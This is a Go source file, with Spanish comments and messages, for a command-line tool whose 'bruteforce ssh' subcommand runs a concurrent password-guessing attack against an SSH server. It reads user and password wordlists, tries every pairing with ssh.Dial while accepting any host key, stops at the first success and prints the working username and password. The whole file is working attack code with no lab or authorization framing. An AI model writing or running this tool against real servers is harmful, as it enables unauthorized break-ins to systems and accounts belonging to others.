// FICHERO: bruteforce.go
package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"
)

func NewBruteforceCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "bruteforce",
		Short: "Realiza ataques de fuerza bruta contra servicios",
	}
	cmd.AddCommand(newSSHBruteCmd())
	return cmd
}

func newSSHBruteCmd() *cobra.Command {
	var target, userFile, passFile string
	var port, concurrency int
	
	cmd := &cobra.Command{
		Use:   "ssh",
		Short: "Realiza un ataque de fuerza bruta contra un servidor SSH",
		Run: func(cmd *cobra.Command, args []string) {
			if target == "" || userFile == "" || passFile == "" {
				log.Fatal("Error: Se requiere un objetivo (-t), un fichero de usuarios (-U) y un fichero de contraseñas (-P).")
			}
			runSSHBruteforce(target, port, userFile, passFile, concurrency)
		},
	}
	cmd.Flags().StringVarP(&target, "target", "t", "", "Dirección IP o hostname del objetivo SSH")
	cmd.Flags().IntVarP(&port, "port", "p", 22, "Puerto del servicio SSH")
	cmd.Flags().StringVarP(&userFile, "users", "U", "", "Ruta al fichero con la lista de usuarios")
	cmd.Flags().StringVarP(&passFile, "passwords", "P", "", "Ruta al fichero con la lista de contraseñas")
	cmd.Flags().IntVarP(&concurrency, "concurrency", "c", 10, "Número de hilos concurrentes")
	return cmd
}

func runSSHBruteforce(target string, port int, userFile, passFile string, concurrency int) {
	users, err := readLines(userFile)
	if err != nil { log.Fatalf("Error leyendo el fichero de usuarios: %v", err) }
	passwords, err := readLines(passFile)
	if err != nil { log.Fatalf("Error leyendo el fichero de contraseñas: %v", err) }
	
	addr := fmt.Sprintf("%s:%d", target, port)
	log.Printf("Iniciando ataque de fuerza bruta SSH contra %s (%d combinaciones)", addr, len(users)*len(passwords))

	var wg sync.WaitGroup
	tasks := make(chan string)
	var found int32 // Para detener el ataque una vez que se encuentra una credencial

	// Iniciar workers
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for combo := range tasks {
				if atomic.LoadInt32(&found) == 1 { // Si ya se encontró, no probar más
					return
				}
				parts := strings.Split(combo, ":")
				user, pass := parts[0], parts[1]
				
				config := &ssh.ClientConfig{
					User: user,
					Auth: []ssh.AuthMethod{ssh.Password(pass)},
					HostKeyCallback: ssh.InsecureIgnoreHostKey(), // Acepta cualquier clave de host
					Timeout: 5 * time.Second,
				}

				client, err := ssh.Dial("tcp", addr, config)
				if err == nil {
					// ¡Éxito!
					fmt.Printf("\n\n[+] ¡¡¡CREDENCIALES ENCONTRADAS!!!\n")
					fmt.Printf("    Host: %s\n", addr)
					fmt.Printf("    Usuario: %s\n", user)
					fmt.Printf("    Contraseña: %s\n\n", pass)
					atomic.StoreInt32(&found, 1) // Marcar como encontrado
					client.Close()
					return
				}
			}
		}()
	}

	// Enviar tareas
	for _, user := range users {
		for _, pass := range passwords {
			if atomic.LoadInt32(&found) == 1 {
				break
			}
			tasks <- fmt.Sprintf("%s:%s", user, pass)
		}
	}
	close(tasks)
	
	wg.Wait()
	if atomic.LoadInt32(&found) == 0 {
		log.Println("Ataque completado. No se encontraron credenciales válidas.")
	}
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil { return nil, err }
	defer file.Close()
	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}